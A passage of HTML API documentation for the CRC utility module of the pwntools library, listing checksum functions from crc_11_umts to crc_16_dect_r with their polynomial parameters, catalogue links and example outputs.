<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_11_umts</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">97</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_12_cdma2000">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_12_cdma2000</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_12_cdma2000" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_12_cdma2000 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0xf13</li>
<li>width   = 12</li>
<li>init    = 0xfff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.12">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.12</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_12_cdma2000</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">3405</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_12_dect">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_12_dect</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_12_dect" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_12_dect checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x80f</li>
<li>width   = 12</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-12-dect">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-12-dect</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_12_dect</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">3931</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_12_gsm">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_12_gsm</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_12_gsm" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_12_gsm checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0xd31</li>
<li>width   = 12</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xfff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-12-gsm">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-12-gsm</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_12_gsm</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">2868</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_12_umts">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_12_umts</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_12_umts" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_12_umts checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x80f</li>
<li>width   = 12</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-12-umts">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-12-umts</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_12_umts</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">3503</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_13_bbc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_13_bbc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_13_bbc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_13_bbc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1cf5</li>
<li>width   = 13</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.13">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.13</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_13_bbc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">1274</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_14_darc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_14_darc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_14_darc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_14_darc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x805</li>
<li>width   = 14</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.14">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.14</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_14_darc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">2093</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_14_gsm">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_14_gsm</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_14_gsm" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_14_gsm checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x202d</li>
<li>width   = 14</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x3fff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-14-gsm">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-14-gsm</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_14_gsm</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">12462</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_15">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_15</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_15" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_15 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4599</li>
<li>width   = 15</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.15">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.15</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_15</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">1438</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_15_mpt1327">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_15_mpt1327</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_15_mpt1327" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_15_mpt1327 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x6815</li>
<li>width   = 15</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x1</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-15-mpt1327">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-15-mpt1327</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_15_mpt1327</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">9574</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_aug_ccitt">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_aug_ccitt</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_aug_ccitt" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_aug_ccitt checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0x1d0f</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-aug-ccitt">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-aug-ccitt</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_aug_ccitt</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">58828</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_buypass">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_buypass</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_buypass" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_buypass checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x8005</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-buypass">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-buypass</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_buypass</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">65256</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_ccitt_false">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_ccitt_false</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_ccitt_false" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_ccitt_false checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-ccitt-false">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-ccitt-false</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_ccitt_false</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">10673</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_cdma2000">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_cdma2000</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_cdma2000" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_cdma2000 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0xc867</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-cdma2000">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-cdma2000</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_cdma2000</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">19462</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_cms">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_cms</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_cms" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_cms checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x8005</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-cms">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-cms</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_cms</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">44775</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_dds_110">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_dds_110</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_dds_110" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_dds_110 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x8005</li>
<li>width   = 16</li>
<li>init    = 0x800d</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-dds-110">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-dds-110</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_dds_110</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">40655</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_dect_r">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_dect_r</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_dect_r" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_dect_r checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x589</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x1</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-dect-r">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-dect-r</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_dect_r</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">126</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_dect_x">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_dect_x</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_dect_x" title="Permalink to this definition">¶</a></dt>
